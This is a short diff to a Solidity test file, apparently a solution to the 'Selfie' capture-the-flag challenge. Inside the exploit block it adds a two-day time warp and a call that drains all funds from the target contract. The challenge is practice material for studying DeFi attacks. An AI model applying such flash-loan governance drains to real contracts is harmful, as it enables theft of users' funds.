@@ -55,6 +55,8 @@ contract Selfie is Test {
         );
 
         flashLoanReceiver.attack();
+        vm.warp(block.timestamp + 2 days);
+        flashLoanReceiver.drainAllFunds();
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
